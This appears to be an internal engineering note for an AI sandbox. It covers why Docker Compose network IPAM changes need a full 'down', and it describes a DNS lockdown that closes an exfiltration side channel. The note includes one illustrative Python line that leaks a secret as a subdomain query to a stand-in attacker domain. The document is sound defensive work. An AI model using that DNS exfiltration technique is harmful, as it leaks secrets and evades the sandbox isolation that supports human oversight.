# Compose network IPAM changes need a full `down`, not just `--force-recreate`

`docker compose up -d --force-recreate` re-creates containers but **does not** re-create networks if their config drifts from what's on the daemon. So any change to `sandbox-internal`'s `ipam.config.subnet`, any service's `ipv4_address`, the agent's `dns:` / `extra_hosts`, or the network's `internal:` flag won't actually land via `recreate` / `rebuild` alone.

**Symptom:** `Error response from daemon: container <id> is not connected to the network ai-sandbox-<p>_sandbox-internal`. The container thinks the new compose says it should be on the network, the network exists with the old IPAM, Docker can't reconcile.

For any change in that class, the procedure is:

```bash
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> down
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> rebuild
```

`down` removes containers AND the network (named volumes are preserved without `-v`). The `COMPOSE_PROFILES` var must be the same across both calls so DB siblings come back on the new IPAM rather than getting stranded on a recreated network without an attached container.

## When this does NOT apply

Squid restart, bind-mount changes, env changes, command changes, image changes — none of those need a `down`. Only the IPAM/network-shape class. Don't reflexively `down` for every compose edit.

## DNS lockdown — why the static IPAM exists in the first place

Docker's built-in DNS resolver at `127.0.0.11` answers names for containers on the same network out of its embedded zone, and **forwards every other name to the host's resolver** — which queries authoritative DNS on the real internet. This forwarding happens regardless of whether the network is `internal: true`. So a container on `sandbox-internal` could:

```python
import socket; socket.getaddrinfo("base32-encoded-secret.attacker.tld", 0)
```

…and the attacker's authoritative NS would receive the subdomain label as a query. That's a textbook DNS exfiltration channel, and `internal: true` does not close it.

The fix has three parts in compose:

1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.0.0/24`) — required to pin sibling IPs.
2. **Static IPs on egress-proxy / postgres / mongo** (`networks.sandbox-internal.ipv4_address`).
3. **`ai-sandbox` gets `dns: [127.0.0.1]`** (sinkhole — no resolver listens there) **plus `extra_hosts`** entries that pre-populate `/etc/hosts` with the internal names.

End state: any `getaddrinfo("egress-proxy")` resolves via `/etc/hosts`. Any `getaddrinfo("anything.else.tld")` returns NXDOMAIN — the libc resolver tries to query 127.0.0.1, gets ECONNREFUSED, gives up. Docker's embedded resolver is never queried (because we overrode `dns:`).

`verify-sandbox.sh` enforces both halves:

- `getent hosts example.com` must fail (external DNS does not resolve).
- `getent hosts egress-proxy` must succeed (internal hostnames still resolve).

**Don't "fix DNS"** by reverting `dns:` to Docker's default or adding `127.0.0.11` to it — that re-opens the side channel. If a tool inside the container needs a new internal hostname, add it to `extra_hosts` (and pin its IP via `ipv4_address` if it's a service we own).
